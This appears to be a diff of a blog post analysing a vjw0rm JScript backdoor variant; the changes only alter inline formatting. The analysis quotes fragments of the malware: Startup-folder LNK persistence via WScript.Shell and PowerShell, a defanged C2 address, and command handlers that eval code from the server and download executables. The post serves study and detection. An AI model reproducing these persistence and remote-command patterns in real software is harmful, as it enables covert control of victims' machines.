@@ -16,22 +16,22 @@ draft: false
 
 __Situation:__
 
-While watching [Any.Run](https://any.run) for interesting scripts to deobfuscate, I noted that its traffic did appear to be like other variants of `vjw0rm` however wasn't sure of what else it could do.
+While watching [Any.Run](https://any.run) for interesting scripts to deobfuscate, I noted that its traffic did appear to be like other variants of __vjw0rm__ however wasn't sure of what else it could do.
 
 __Metadata:__
 
-- Sample: `3236312b9dc691dd8b9214f08ff01e5d`
+- Sample: __3236312b9dc691dd8b9214f08ff01e5d__
 
 __Analysis__
 
 The obfuscation techniques are pretty standard, the first stage deobfuscates base64 data then performs mathematic operations on it (I don't give a crap how they work I just let it do the heavy lifting for me), interestingly the base64 string is reversed.
 
-After this then the obfuscation consistently used `eval` which is easily replaced with `console.log` and ran using `nodejs` to dump the next stages.
+After this then the obfuscation consistently used __eval__ which is easily replaced with __console.log__ and ran using __nodejs__ to dump the next stages.
 
 It took approximatly twenty different times dumping the obfuscated code before I was able to access the deobfuscated code.
 
 
-The script starts with setting up some global variables the script needs to run then makes a call to `ModinySks()`, this function is responsible to establishing persistence.
+The script starts with setting up some global variables the script needs to run then makes a call to __ModinySks()__, this function is responsible to establishing persistence.
 
 ```js
 var shell = new ActiveXObject('WScript.Shell');
@@ -56,7 +56,7 @@ var lnkf = Startup + wn + '.lnk';
 ModinySks();
 ```
 
-We can see that `powershell.exe` is used to copy, the backdoor script to the `%AppData%` folder then establishing persistence in the startup folder as a `LNK` file.
+We can see that __powershell.exe__ is used to copy, the backdoor script to the __%AppData%__ folder then establishing persistence in the startup folder as a __LNK__ file.
 
 ```js
 function ModinySks() {
@@ -70,9 +70,9 @@ function ModinySks() {
 }
 ```
 
-After persistence is achieved, it will checkin to the C2 server `seko[.]vipers[.]pw:8880`, send fingerprinting data in the `User-Agent`.
+After persistence is achieved, it will checkin to the C2 server __seko[.]vipers[.]pw:8880__, send fingerprinting data in the __User-Agent__.
 
-Interestingly, this variant adds the `X-Header` HTTP header with the variant prefix / version as well.
+Interestingly, this variant adds the __X-Header__ HTTP header with the variant prefix / version as well.
 
 ```js
 function SendHttp(R) {
@@ -86,7 +86,7 @@ function SendHttp(R) {
 }
 ```
 
-The C2 server response body will be parsed by use of the delimiter `|V|` much like previous variants.
+The C2 server response body will be parsed by use of the delimiter __|V|__ much like previous variants.
 
 ```js
 var send = SendHttp();
@@ -103,7 +103,7 @@ if (order === 'Ex') {
 	eval(order_data);
 }
 ```
-Command from C2: `Ex|V|<jscript_code>`
+Command from C2: __Ex|V|<jscript_code>__
 
 __C2 Command (Cmd):__
 
@@ -114,7 +114,7 @@ if (order === 'Cmd') {
 }
 ```
 
-Command from C2: `Cmd|V|whoami`
+Command from C2: __Cmd|V|whoami__
 
 __C2 Command (DwnlExe):__
 
@@ -128,7 +128,7 @@ if (order === 'DwnlExe') {
 }
 ```
 
-Command from C2: `DwnlExe|V|<url>|V|<path>`
+Command from C2: __DwnlExe|V|<url>|V|<path>__
 
 __C2 Command (DwnlOnly):__
 
@@ -183,7 +183,7 @@ if (order === 'UpdateS') {
 }
 ```
 
-Command from C2: `UpdateS|V|<url>|V|<tmp_file_name>`
+Command from C2: __UpdateS|V|<url>|V|<tmp_file_name>__
 
 __C2 Checkin Traffic:__
 
@@ -200,7 +200,7 @@ Connection: Keep-Alive
 Cache-Control: no-cache
 ```
 
-If you look closely the difference are the use of the `PUT` HTTP method and the use of the `x-header`.
+If you look closely the difference are the use of the __PUT__ HTTP method and the use of the __x-header__.
 
 This is easy enough to create detection for.
 
